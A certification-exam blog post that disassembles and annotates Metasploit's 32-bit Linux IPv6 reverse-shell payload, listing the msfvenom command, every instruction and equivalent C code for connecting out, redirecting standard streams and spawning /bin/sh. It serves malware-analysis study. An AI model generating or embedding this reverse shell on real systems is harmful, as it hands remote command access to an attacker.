---
title: "SLAE x86 Exam - Assignment #5 Part 4"
date: 2021-12-25
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - assembly
  - nasm
  - c
  - exam
  - shellcode
  - x86
  - metasploit
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The 5th assignment requires you to analyze at least 3 shellcode samples created using Msfpayload (nowadays `msfvenom`) for 32-bit Linux systems.

Programs like `gdb`/`ndisasm`/`libemu` can be used for dissecting the shellcode and performing the analysis.

I chose the following 4 shellcode samples:

Name | Description
-|-
linux/x86/adduser | Create a new user with UID 0
linux/x86/shell/reverse_nonx_tcp | Spawn a command shell (staged). Connect back to the attacker
linux/x86/shell_find_tag | Spawn a shell on an established connection (proxy/nat safe)
linux/x86/shell_reverse_tcp_ipv6 | Connect back to attacker and spawn a command shell over IPv6

In this post I'll analyse `linux/x86/shell_reverse_tcp_ipv6`.

## Analysis

### NDISASM

To generate the payload:

```bash
msfvenom -p linux/x86/shell_reverse_tcp_ipv6 LHOST=fe80::250:56ff:fe22:364b LPORT=4444 -o shellcode.bin
```

To analyse it with `ndisasm`:

```bash
ndisasm shellcode.bin -b 32 -p intel
```

It returns the following output (comments are mine though):

```nasm
                            ; EDX:EAX = EBX * 0
00000000  31DB              xor ebx,ebx
00000002  F7E3              mul ebx
```

{% sidenote Useful for polymorphism: besides `EBX`, they clear `EAX` and `EDX` too %}

```nasm
                            ; IPPROTO_TCP
00000004  6A06              push byte +0x6

                            ; SOCK_STREAM
00000006  6A01              push byte +0x1

                            ; AF_INET6
00000008  6A0A              push byte +0xa

                            ; pointer to arguments of socket()
0000000A  89E1              mov ecx,esp

                            ; call socketcall(SYS_SOCKET, ...)
0000000C  B066              mov al,0x66
0000000E  B301              mov bl,0x1

                            ; C code: socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
00000010  CD80              int 0x80
```

The instructions above create a `TCP` socket based on the `IPv6` protocol. The return value, stored into the register `EAX` (and later moved into `ESI`), is a file descriptor.

```nasm
                            ; save File Descriptor of the socket
00000012  89C6              mov esi,eax

                            ; clear ECX and EBX and push 0x00000000 to the stack
00000014  31C9              xor ecx,ecx
00000016  31DB              xor ebx,ebx
00000018  53                push ebx
```

{% sidenote I don't know exactly why the author pushed the DWORD `0x00000000` two times, thus making the struct 32-bytes long, when the size should be only 28 bytes. If you know, please contact me. %}

```nasm
                            ; bytes 24-27 of the sockaddr_in6 struct:
                            ;   value of sin6_scope_id: 0x00000000
00000019  53                push ebx
```

```nasm
                            ; bytes 8-23 of the sockaddr_in6 struct:
                            ;    value of sin6_addr: fe80::250:56ff:fe22:364b (big-endian)
0000001A  68FE22364B        push dword 0x4b3622fe
0000001F  68025056FF        push dword 0xff565002
00000024  6A00              push byte +0x0
00000026  68FE800000        push dword 0x80fe
```

{% sidenote Bytes in big-endian order representing the IPv6 address: `fe80::250:56ff:fe22:364b` %}

```nasm
                            ; bytes 4-7 of the sockaddr_in6 struct:
                            ;   value of sin6_flowinfo: 0x00000000
0000002B  53                push ebx

                            ; bytes 2-3 of the sockaddr_in6 struct:
                            ;   value of sin6_port: port 4444 in big-endian order
0000002C  6668115C          push word 0x5c11

                            ; bytes 0-1 of the sockaddr_in6 struct:
                            ;   value of sin6_family: AF_INET6
00000030  66680A00          push word 0xa

                            ; save the pointer to the sockaddr_in6 struct into ECX
00000034  89E1              mov ecx,esp

                            ; 3rd argument of connect():
                            ;   size of the sockaddr_in6 struct (28 bytes): 
00000036  6A1C              push byte +0x1c

                            ; 2nd argument of connect():
                            ;   pointer to the sockaddr_in6 struct
00000038  51                push ecx

                            ; 1st argument of connect():
                            ;   File Descriptor of the client socket
00000039  56                push esi

                            ; clear registers
0000003A  31DB              xor ebx,ebx
0000003C  31C0              xor eax,eax

                            ; socketcall() syscall
0000003E  B066              mov al,0x66

                            ; 1st argument of socketcall():
                            ;   SYS_CONNECT call
00000040  B303              mov bl,0x3

                            ; 2nd argument of socketcall():
                            ;   pointer to the arguments of SYS_CONNECT
00000042  89E1              mov ecx,esp

                            ; call socketcall() syscall, in turn calling connect(...)
00000044  CD80              int 0x80
```

The disassembly I analysed up until now can be converted into the following C code:

```cpp
// create an IPv6 socket
int fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

// allocate space for the struct containing IPv6 address and TCP port
struct sockaddr_in6 addr;

// set the socket to use IPv6
addr.sin6_family = AF_INET6;

// convert the TCP port number to big-endian (instead of little-endian)
addr.sin6_port = htons(4444);

// convert the string to an IPv6 address (big-endian)
inet_pton(AF_INET6, "fe80::250:56ff:fe22:364b", &(addr.sin6_addr));

// connect to fe80::250:56ff:fe22:364b:4444
connect(fd, (struct sockaddr *)&addr, sizeof(addr));
```

So, first it creates a `TCP socket` based on the `IPv6` protocol. After that, it connects the socket referred to by the file descriptor `fd` to the address identified by:

- IP address: `fe80::250:56ff:fe22:364b`
- TCP port: `4444`

Next, the function `dup2` is used for redirecting file descriptors.

```nasm
                            ; clear EBX, setting it to 0
00000046  31DB              xor ebx,ebx

                            ; compare EAX with EBX, if they are equal,
                            ;   the flag ZF will be set, as cmp
                            ;   simply subtracts the bytes
00000048  39D8              cmp eax,ebx

                            ; if the flag ZF is set, and the two registers are equal,
                            ;   then jumps to 00000082 (calls nanosleep())
0000004A  7536              jnz 0x82

                            ; 2nd argument of dup2():
                            ;   newfd: file descriptor to be redirected,
                            ;   in this case stdin
0000004C  31C9              xor ecx,ecx

                            ; clear ECX, EDX, EAX
0000004E  F7E1              mul ecx

                            ; 1st argument of dup2():
                            ;   oldfd, i.e. the destination of the redirection of
                            ;   the file descriptor specified in the arg. newfd (ECX)
00000050  89F3              mov ebx,esi

                            ; call syscall dup2()
00000052  B03F              mov al,0x3f
00000054  CD80              int 0x80
```

{% sidenote Redirect `stdin` to the previously-created socket %}

```nasm
                            ; clear EAX
00000056  31C0              xor eax,eax

                            ; 2nd argument of dup2(): stdout
00000058  41                inc ecx

                            ; 1st argument of dup2(): the IPv6 socket
00000059  89F3              mov ebx,esi

                            ; call syscall dup2()
0000005B  B03F              mov al,0x3f
0000005D  CD80              int 0x80
```

{% sidenote Redirect `stdout` to the previously-created socket %}

```nasm
                            ; clear EAX
0000005F  31C0              xor eax,eax

                            ; 2nd argument of dup2(): stderr
00000061  41                inc ecx

                            ; 1st argument of dup2(): the IPv6 socket
00000062  89F3              mov ebx,esi

00000064  B03F              mov al,0x3f
00000066  CD80              int 0x80
```

{% sidenote Redirect `stderr` to the previously-created socket %}

So far the disassembly I analysed is equal to the following C code:

```cpp
dup2(fd, 0);
dup2(fd, 1);
dup2(fd, 2);
```

Next, a shell is spawned.

```nasm
                            ; clear EDX and EAX
                            ; 3rd argument of execve(): envp
                            ;   array of pointers to strings (env. variables)
                            ; in this case it's a null pointer
00000068  31D2              xor edx,edx
0000006A  F7E2              mul edx

                            ; push a string to the stack and add 4 null bytes at the end
                            ;   string: /bin//sh
0000006C  52                push edx
0000006D  682F2F7368        push dword 0x68732f2f
00000072  682F62696E        push dword 0x6e69622f

                            ; 1st argument of execve(): pathname, a pointer to the
                            ;   executable to run
00000077  89E3              mov ebx,esp

                            ; array of pointers to command-line arguments
                            ;   - EBX -> "/bin//sh"
                            ;   - EDX -> 0x00000000 
00000079  52                push edx
0000007A  53                push ebx

                            ; 2nd argument of execve(): argv
                            ;   array of pointers to strings (command-line arguments)
0000007B  89E1              mov ecx,esp

                            ; call execve() syscall
0000007D  B00B              mov al,0xb
0000007F  CD80              int 0x80
```

As for the second assignment, once the shellcode correctly redirected `stdin`, `stdout`, and `stderr` to the file descriptor of the server socket (a Metasploit handler to be specific), it uses `execve` to spawn the reverse shell.

In this case it uses the shell `/bin//sh`, as the string occupies only `8 bytes`, but we could also replace it with `/bin/bash`.

If the shellcode can't connect to the remote server, then it jumps to the address `00000082`, which is the start of a block of assembly instructions that call the syscall `nanosleep()` in order to sleep for `10` seconds:

```nasm
                            ; I don't know why the use of this instruction.
                            ; Once the shellcode spawns a shell, the code of the program
                            ; should be replace, so it seems useless
00000081  C3                ret

                            ; clear EBX and push 0x00000000 to the stack
00000082  31DB              xor ebx,ebx
00000084  53                push ebx  

                            ; push the DWORD 0x0000000a to the stack
00000085  6A0A              push byte +0xa

                            ; clear EAX and EDX
00000087  F7E3              mul ebx

                            ; 1st argument of nanosleep():
                            ;   pointer to a timespec structure
00000089  89E3              mov ebx,esp

                            ; call nanosleep()
0000008B  B0A2              mov al,0xa2
0000008D  CD80              int 0x80
```

The interesting fact about `nanosleep` is that it doesn't simply use a integer to determine how many seconds/nanoseconds to sleep, but it uses a `struct`. According to the [Linux manual](https://man7.org/linux/man-pages/man2/nanosleep.2.html), it is structured as follows:

```cpp
struct timespec {
    time_t tv_sec;        /* seconds */
    long   tv_nsec;       /* nanoseconds */
};
```

Based on a few files of the Linux kernel, the size of `time_t` should be `4 bytes` on `x86` systems, same for the `long` type. So we're looking at a struct made out of `8 bytes`.

The first 4 bytes specify the number of `seconds` to sleep, while the other ones specify the number of `nanoseconds` to sleep.

Since the `stack` grows downward, we have to push the value of `tv_nsec` to the stack first, and then push the value of `tv_sec`. Let's look again at the struct:

```nasm
                            ; clear EBX
00000082  31DB              xor ebx,ebx

                            ; push the value of `tv_nsec` to the stack
                            ; sleep 0 nanoseconds
00000084  53                push ebx  

                            ; push the value of `tv_sec` to the stack
                            ; sleep 10 seconds
00000085  6A0A              push byte +0xa

                            ; clear EAX and EDX
00000087  F7E3              mul ebx

                            ; 1st argument of nanosleep():
                            ;   pointer to a timespec structure
00000089  89E3              mov ebx,esp
```

Once the shellcode sleeps `10 seconds`, it goes back attempting to connect to the remote server (address `00000014`):

```nasm
                            ; go back to 00000014 (to connect to the remote server)
0000008F  E980FFFFFF        jmp 0x14

                            ; apparently, this instruction is never going to be executed 
00000094  C3                ret
```

Finally, there are some instructions that call the syscall `exit()`, in order to exit gracefully.

```nasm
                            ; call exit() syscall
00000095  31C0              xor eax,eax
00000097  B001              mov al,0x1
00000099  CD80              int 0x80
```

From what it seems, this last syscall is never executed. In fact, there are only two possibilities:

- executes `/bin//sh`
- loops forever, sleeping `10 seconds` and trying to connect to the remote server

Perhaps these instructions were added for conformitiy with other Linux executable, as a way not to *stand out*.
